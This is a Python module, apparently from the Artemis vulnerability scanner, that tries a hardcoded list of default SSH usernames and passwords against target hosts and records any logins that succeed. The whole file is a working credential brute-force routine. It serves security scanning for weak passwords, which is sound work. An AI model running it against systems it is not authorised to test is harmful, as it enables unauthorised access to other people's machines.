#!/usr/bin/env python3
import socket
from typing import List, Tuple

import paramiko
from karton.core import Task
from pydantic import BaseModel

from artemis.binds import Service, TaskStatus, TaskType
from artemis.module_base import ArtemisBase
from artemis.task_utils import get_target_host
from artemis.utils import throttle_request

BRUTE_CREDENTIALS = [
    ("user", "password"),
    ("user", "user"),
    ("root", ""),
    ("root", "root"),
    ("root", "password"),
    ("root", "admin"),
    ("admin", "admin"),
    ("test", "test"),
    ("ppp", "ppp"),
]


class SSHBruterResult(BaseModel):
    credentials: List[Tuple[str, str]] = []


class SSHBruter(ArtemisBase):
    """
    Performs a brute force attack on SSH.
    """

    identity = "ssh_bruter"
    filters = [
        {"type": TaskType.SERVICE.value, "service": Service.SSH.value},
    ]

    def run(self, current_task: Task) -> None:
        host = get_target_host(current_task)
        port = current_task.get_payload("port")

        result = SSHBruterResult()
        for username, password in BRUTE_CREDENTIALS:
            try:
                client = paramiko.client.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                throttle_request(lambda: client.connect(hostname=host, port=port, username=username, password=password))
                result.credentials.append((username, password))
                client.close()
            except (
                paramiko.AuthenticationException,
                paramiko.BadHostKeyException,
                socket.error,
                socket.gaierror,
                paramiko.ssh_exception.NoValidConnectionsError,
                paramiko.ssh_exception.SSHException,
            ):
                pass

        if result.credentials:
            status = TaskStatus.INTERESTING
            status_reason = "Found working credentials for SSH connection: " + ", ".join(
                sorted([username + ":" + password for username, password in result.credentials])
            )
        else:
            status = TaskStatus.OK
            status_reason = None
        self.db.save_task_result(task=current_task, status=status, status_reason=status_reason, data=result)


if __name__ == "__main__":
    SSHBruter().loop()
